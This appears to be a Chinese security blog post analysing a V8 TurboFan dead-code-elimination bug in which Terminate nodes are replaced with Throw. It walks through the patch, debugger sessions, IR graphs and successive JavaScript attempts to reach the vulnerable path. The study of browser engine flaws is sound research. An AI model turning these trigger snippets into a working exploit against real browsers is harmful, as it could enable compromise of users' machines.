<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct TypedLoweringPhase &#123;</span><br><span class="line">  DECL_PIPELINE_PHASE_CONSTANTS(TypedLowering)</span><br><span class="line"></span><br><span class="line">  void Run(PipelineData* data, Zone* temp_zone) &#123;</span><br><span class="line">    ....................</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line">    ....................</span><br><span class="line">    graph_reducer.ReduceGraph();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>分析<code>ReduceEffectNode</code>的代码，首先得满足<code>FindDeadInput(node)</code>的条件，<code>FindDeadInput(node)</code>代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Node* FindDeadInput(Node* node) &#123;</span><br><span class="line">  for (Node* input : node-&gt;inputs()) &#123;</span><br><span class="line">    if (NoReturn(input)) return input;</span><br><span class="line">  &#125;</span><br><span class="line">  return nullptr;</span><br><span class="line">&#125;</span><br><span class="line">bool NoReturn(Node* node) &#123;</span><br><span class="line">  return node-&gt;opcode() == IrOpcode::kDead ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kUnreachable ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kDeadValue ||</span><br><span class="line">         NodeProperties::GetTypeOrAny(node).IsNone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了弄清楚整个过程，我们使用如下代码测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">async function opt() &#123;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先使用<code>--trace-turbo</code>选项生成IR图，然后我们使用gdb进行调试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">set args ./t.js</span><br><span class="line">r</span><br><span class="line">^C</span><br><span class="line">b pipeline.cc:2437</span><br><span class="line">b DeadCodeElimination::ReduceEffectNode</span><br><span class="line">dis 2</span><br><span class="line">r</span><br></pre></td></tr></table></figure>
<p>其中pipeline.cc:2437处为<code>  Run&lt;TypedLoweringPhase&gt;();</code>，即我们在TypedLoweringPhase阶段断点，因为<code>DeadCodeElimination</code>在前面的阶段也有调用，所以得先让<code>TypedLoweringPhase</code>断下，然后开启断点2，并继续运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc</span><br><span class="line">   283   &#125;</span><br><span class="line">   284   return NoChange();</span><br><span class="line">   285 &#125;</span><br><span class="line">   286 </span><br><span class="line">   287 Reduction DeadCodeElimination::ReduceEffectNode(Node* node) &#123;</span><br><span class="line"> ► 288   DCHECK_EQ(1, node-&gt;op()-&gt;EffectInputCount());</span><br><span class="line">   289   Node* effect = NodeProperties::GetEffectInput(node, 0);</span><br><span class="line">   290   if (effect-&gt;opcode() == IrOpcode::kDead) &#123;</span><br><span class="line">   291     return Replace(effect);</span><br><span class="line">   292   &#125;</span><br><span class="line">   293   if (Node* input = FindDeadInput(node)) &#123;</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$3 = 6</span><br></pre></td></tr></table></figure>
<p>可以知道当前处理的上节点6，即对应图中的6: Checkpoint<br><img src="https://i.loli.net/2021/07/12/VuHyBFT39kKtbl2.png" alt="image.png"><br>可以知道，其输入节点中没有满足<code>FindDeadInput</code>，继续运行，处理下一个节点，我们可以在满足条件<code>if (Node* input = FindDeadInput(node))</code>里下断点，然后继续运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b dead-code-elimination.cc:294</span><br><span class="line">dis 2</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<p>此时断下了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc</span><br><span class="line">   289   Node* effect = NodeProperties::GetEffectInput(node, 0);</span><br><span class="line">   290   if (effect-&gt;opcode() == IrOpcode::kDead) &#123;</span><br><span class="line">   291     return Replace(effect);</span><br><span class="line">   292   &#125;</span><br><span class="line">   293   if (Node* input = FindDeadInput(node)) &#123;</span><br><span class="line"> ► 294     if (effect-&gt;opcode() == IrOpcode::kUnreachable) &#123;</span><br><span class="line">   295       RelaxEffectsAndControls(node);</span><br><span class="line">   296       return Replace(DeadValue(input));</span><br><span class="line">   297     &#125;</span><br><span class="line">   298 </span><br><span class="line">   299     Node* control = node-&gt;op()-&gt;ControlInputCount() == 1</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$2 = 87</span><br></pre></td></tr></table></figure>
<p>当前处理的节点是87<br><img src="https://i.loli.net/2021/07/12/oEUqHpbvzODg4NI.png" alt="image.png"><br>那么就是说<code>87: SpeculativeToNumber</code>这个节点将被替换为<code>Unreachable</code>，这说明<code>87: SpeculativeToNumber</code>的<code>inputs</code>满足了<code>FindDeadInput(node)</code>的条件，进一步调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p input-&gt;opcode()</span><br><span class="line">$66 = v8::internal::compiler::IrOpcode::kCheckSmi</span><br><span class="line">pwndbg&gt; p NodeProperties::GetTypeOrAny(input).IsNone()</span><br><span class="line">$67 = true</span><br><span class="line">pwndbg&gt; p input-&gt;id()</span><br><span class="line">$68 = 85</span><br></pre></td></tr></table></figure>
<p>可以知道是<code>85: CheckSmi</code>这个节点，由于推断出了其类型不属于Smi，因为我们的脚本中下标为<code>0x100000000</code>，因此这个输入节点是无效的。<br><img src="https://i.loli.net/2021/07/12/y9gprt1F2oakACU.png" alt="image.png"><br>于是87节点被替换为了Unreachable节点，且新节点的标号为148。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc</span><br><span class="line">   300                         ? NodeProperties::GetControlInput(node, 0)</span><br><span class="line">   301                         : graph()-&gt;start();</span><br><span class="line">   302     Node* unreachable =</span><br><span class="line">   303         graph()-&gt;NewNode(common()-&gt;Unreachable(), effect, control);</span><br><span class="line">   304     NodeProperties::SetType(unreachable, Type::None());</span><br><span class="line"> ► 305     ReplaceWithValue(node, DeadValue(input), node, control);</span><br><span class="line">   306     return Replace(unreachable);</span><br><span class="line">   307   &#125;</span><br><span class="line">   308 </span><br><span class="line">   309   return NoChange();</span><br><span class="line">   310 &#125;</span><br><span class="line">pwndbg&gt; p unreachable-&gt;id()</span><br><span class="line">$69 = 148</span><br></pre></td></tr></table></figure>
<p>这与TypedLowering阶段的IR图相吻合。<br><img src="https://i.loli.net/2021/07/12/T7k3FvoeSynEMWa.png" alt="image.png"></p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/dead-code-elimination.cc b/src/compiler/dead-code-elimination.cc</span><br><span class="line">index f39e6ca..bab6b7b 100644</span><br><span class="line">--- a/src/compiler/dead-code-elimination.cc</span><br><span class="line">+++ b/src/compiler/dead-code-elimination.cc</span><br><span class="line">@@ -317,7 +317,10 @@</span><br><span class="line">          node-&gt;opcode() == IrOpcode::kTailCall);</span><br><span class="line">   Reduction reduction = PropagateDeadControl(node);</span><br><span class="line">   if (reduction.Changed()) return reduction;</span><br><span class="line">-  if (FindDeadInput(node) != nullptr) &#123;</span><br><span class="line">+  // Terminate nodes are not part of actual control flow, so they should never</span><br><span class="line">+  // be replaced with Throw.</span><br><span class="line">+  if (node-&gt;opcode() != IrOpcode::kTerminate &amp;&amp;</span><br><span class="line">+      FindDeadInput(node) != nullptr) &#123;</span><br><span class="line">     Node* effect = NodeProperties::GetEffectInput(node, 0);</span><br><span class="line">     Node* control = NodeProperties::GetControlInput(node, 0);</span><br><span class="line">     if (effect-&gt;opcode() != IrOpcode::kUnreachable) &#123;</span><br></pre></td></tr></table></figure>
<p>从patch中可以知道，漏洞点出现在<code>dead-code-elimination</code>中的<code>DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Reduction DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall(</span><br><span class="line">    Node* node) &#123;</span><br><span class="line">  DCHECK(node-&gt;opcode() == IrOpcode::kDeoptimize ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kReturn ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kTerminate ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kTailCall);</span><br><span class="line">  Reduction reduction = PropagateDeadControl(node);</span><br><span class="line">  if (reduction.Changed()) return reduction;</span><br><span class="line">  if (FindDeadInput(node) != nullptr) &#123;</span><br><span class="line">    Node* effect = NodeProperties::GetEffectInput(node, 0);</span><br><span class="line">    Node* control = NodeProperties::GetControlInput(node, 0);</span><br><span class="line">    if (effect-&gt;opcode() != IrOpcode::kUnreachable) &#123;</span><br><span class="line">      effect = graph()-&gt;NewNode(common()-&gt;Unreachable(), effect, control);</span><br><span class="line">      NodeProperties::SetType(effect, Type::None());</span><br><span class="line">    &#125;</span><br><span class="line">    node-&gt;TrimInputCount(2);</span><br><span class="line">    node-&gt;ReplaceInput(0, effect);</span><br><span class="line">    node-&gt;ReplaceInput(1, control);</span><br><span class="line">    NodeProperties::ChangeOp(node, common()-&gt;Throw());</span><br><span class="line">    return Changed(node);</span><br><span class="line">  &#125;</span><br><span class="line">  return NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>patch修复的情况是不将<code>Terminate</code>节点替换为<code>Throw</code>节点，因此漏洞就发生在将Terminate节点替换为Throw以后。首先分析如何触发该代码路径，即当前node必须为<code>Terminate</code>，且其输入满足<code>FindDeadInput(node)</code>的条件。<br>首先尝试如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">async function opt() &#123;</span><br><span class="line">   while (deadcode) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现其并没有被替换为Throw，这是因为Terminate的两个inputs均有效，不满足<code>FindDeadInput</code>的条件<br><img src="https://i.loli.net/2021/07/12/khH1BDfJTtErlUS.png" alt="image.png"><br>如果能够在Terminate节点之前添加一个Unreachable节点，那么进入<code>ReduceDeoptimizeOrReturnOrTerminateOrTailCall</code>函数时就能触发到漏洞点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   async function deadcode() &#123;</span><br><span class="line">      while (deaddeaddead) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   deadcode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时发现Terminate节点不仅没有被替换为Throw节点，反而是被去除掉了。<br><img src="https://i.loli.net/2021/07/12/R8g1JiCGu3KAehU.png" alt="image.png"><br>经过调试，发现Terminate节点在<code>DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall</code>函数中的<code>PropagateDeadControl</code>被消除了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Reduction DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall(</span><br><span class="line">    Node* node) &#123;</span><br><span class="line">  DCHECK(node-&gt;opcode() == IrOpcode::kDeoptimize ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kReturn ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kTerminate ||</span><br><span class="line">         node-&gt;opcode() == IrOpcode::kTailCall);</span><br><span class="line">  Reduction reduction = PropagateDeadControl(node);</span><br><span class="line">  if (reduction.Changed()) return reduction;</span><br><span class="line">  .................</span><br><span class="line">   81 Reduction DeadCodeElimination::PropagateDeadControl(Node* node) &#123;</span><br><span class="line">   82   DCHECK_EQ(1, node-&gt;op()-&gt;ControlInputCount());</span><br><span class="line">   83   Node* control = NodeProperties::GetControlInput(node);</span><br><span class="line"> ► 84   if (control-&gt;opcode() == IrOpcode::kDead) return Replace(control);</span><br><span class="line">   85   return NoChange();</span><br><span class="line">   86 &#125;</span><br><span class="line">pwndbg&gt; p control-&gt;opcode()</span><br><span class="line">$40 = v8::internal::compiler::IrOpcode::kDead</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$41 = 81</span><br><span class="line">pwndbg&gt; p node-&gt;opcode()</span><br><span class="line">$42 = v8::internal::compiler::IrOpcode::kTerminate</span><br></pre></td></tr></table></figure>
<p>可以知道，这里Terminate节点被消除的原因时因为他的控制流输入全都无效了,而对于Terminate节点，其有两个输入，一个是EffectPhi，另一个是LOOP，经过调试发生这两个节点都会被优化掉，究其原因是因为循环中的变量依赖过于简单，示例中，我们的条件是deaddeaddead，这个不存在的变量直接被判断无效，导致整个循环都会被优化去除。<br><img src="https://i.loli.net/2021/07/13/rSHIk2519iayvcK.png" alt="image.png"><br>尝试将代码修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   async function deadcode() &#123;</span><br><span class="line">      const obj = &#123;&#125;;</span><br><span class="line">      while (obj) &#123;</span><br><span class="line">         dead(beef);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   deadcode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现在<code>Inlining</code>阶段，代码就被标记为dead了，且LOOP节点也不见了<br><img src="https://i.loli.net/2021/07/13/m5a1wVt3Sf9UKCz.png" alt="image.png"><br>因此继续更正我们的代码，使得至少循环语句是没有问题的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   async function deadcode() &#123;</span><br><span class="line">      const obj = &#123;&#125;;</span><br><span class="line">      while (1) &#123;</span><br><span class="line">         if (obj) &#123;</span><br><span class="line">             dead(beef);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   deadcode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这回在Inline阶段，Terminate和LOOP节点被保留了，但是在TypedLowering阶段，Terminate节点仍然被消除了，但是在实际调试中，<code>ReduceDeoptimizeOrReturnOrTerminateOrTailCall</code>函数中处理Terminate节点时，其输入节点并不全都是<code>Dead</code>状态，因此这回没有在<code>ReduceDeoptimizeOrReturnOrTerminateOrTailCall</code>中被消除，经过调试发现是在<code>DeadCodeElimination::ReduceLoopOrMerge</code>中被消除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Reduction DeadCodeElimination::ReduceLoopOrMerge(Node* node) &#123;</span><br><span class="line">  DCHECK(IrOpcode::IsMergeOpcode(node-&gt;opcode()));</span><br><span class="line">  Node::Inputs inputs = node-&gt;inputs();</span><br><span class="line">  DCHECK_LE(1, inputs.count());</span><br><span class="line">  // Count the number of live inputs to &#123;node&#125; and compact them on the fly, also</span><br><span class="line">  // compacting the inputs of the associated &#123;Phi&#125; and &#123;EffectPhi&#125; uses at the</span><br><span class="line">  // same time.  We consider &#123;Loop&#125;s dead even if only the first control input</span><br><span class="line">  // is dead.</span><br><span class="line">  .....................</span><br><span class="line">  &#125; else if (live_input_count == 1) &#123;</span><br><span class="line">      ......................</span><br><span class="line">      &#125; else if (use-&gt;opcode() == IrOpcode::kTerminate) &#123;</span><br><span class="line">        DCHECK_EQ(IrOpcode::kLoop, node-&gt;opcode());</span><br><span class="line">        Replace(use, dead());</span><br><span class="line">      &#125;</span><br><span class="line">....................</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc</span><br><span class="line">   150         // Remember the loop exits so that we can mark their loop input dead.</span><br><span class="line">   151         // This has to be done after the use list iteration so that we do</span><br><span class="line">   152         // not mutate the use list while it is being iterated.</span><br><span class="line">   153         loop_exits.push_back(use);</span><br><span class="line">   154       &#125; else if (use-&gt;opcode() == IrOpcode::kTerminate) &#123;</span><br><span class="line"> ► 155         DCHECK_EQ(IrOpcode::kLoop, node-&gt;opcode());</span><br><span class="line">   156         Replace(use, dead());</span><br><span class="line">   157       &#125;</span><br><span class="line">   158     &#125;</span><br><span class="line">   159     for (Node* loop_exit : loop_exits) &#123;</span><br><span class="line">   160       loop_exit-&gt;ReplaceInput(1, dead());</span><br><span class="line">pwndbg&gt; p node-&gt;inputs()[0]-&gt;id()</span><br><span class="line">$79 = 50</span><br><span class="line">pwndbg&gt; p node-&gt;inputs()[0]-&gt;opcode()</span><br><span class="line">$80 = v8::internal::compiler::IrOpcode::kJSCreateTypedArray</span><br><span class="line">pwndbg&gt; p node-&gt;inputs()[1]-&gt;id()</span><br><span class="line">$81 = 148</span><br><span class="line">pwndbg&gt; p node-&gt;inputs()[1]-&gt;opcode()</span><br><span class="line">$82 = v8::internal::compiler::IrOpcode::kDead</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$83 = 82</span><br><span class="line">pwndbg&gt; p node-&gt;opcode()</span><br><span class="line">$84 = v8::internal::compiler::IrOpcode::kLoop</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/13/eY9y1OVCXZlBvF3.png" alt="image.png"><br>与IR图对应起来，<code>DeadCodeElimination::ReduceLoopOrMerge</code>的规则是，如果LOOP节点的有效输入节点为1个，那么Terminate节点会被消除。<br>尝试改造为嵌套循环</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   async function deadcode() &#123;</span><br><span class="line">      const obj = &#123;&#125;;</span><br><span class="line">      while (1) &#123;</span><br><span class="line">             while (obj) &#123;</span><br><span class="line">                dead(beef);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   deadcode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/13/A78s2wZmWX5UqKa.png" alt="image.png"><br>此时LOOP的第二个输入节点的路径上条件过于简单，将导致被优化去除，因此，我们尝试在内层循环中增加一个条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   async function deadcode() &#123;</span><br><span class="line">      const obj = &#123;&#125;;</span><br><span class="line">      while (1) &#123;</span><br><span class="line">         if (badbeef) &#123;</span><br><span class="line">             while (obj) &#123;</span><br><span class="line">                dead(beef);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   deadcode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/13/CfOIdXViWx15yjG.png" alt="image.png"><br>此时节点上Merge，该节点的第二个输入节点的路径也过于简单，将导致其第二个输入为dead，因此在<code>DeadCodeElimination::ReduceLoopOrMerge</code>中<code>108: Merge</code>会被替换为<code>Inputs[0]</code>，即更新为<code>107: ifFalse</code>，该路径同样后续会变成dead。<br>尝试复杂化条件表达式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   async function deadcode() &#123;</span><br><span class="line">      const obj = &#123;&#125;;</span><br><span class="line">      while (1) &#123;</span><br><span class="line">         if (badbeef + a + b + c*d) &#123;</span><br><span class="line">             while (obj) &#123;</span><br><span class="line">                dead(beef);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   deadcode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这回发现Terminate节点没有生成，在inline阶段就出现了Dead节点，且整个流程依赖简单，导致后续LOOP节点的输入都无效从而被优化去除。<br><img src="https://i.loli.net/2021/07/13/qS3mMHeLhpN9TY5.png" alt="image.png"><br>通过实验可以发现，在DeadCode后面放置<code>await</code>语句，可以增加多个节点分支于LOOP节点的路径上，这样LOOP节点前期就不会被优化去掉了。</p>
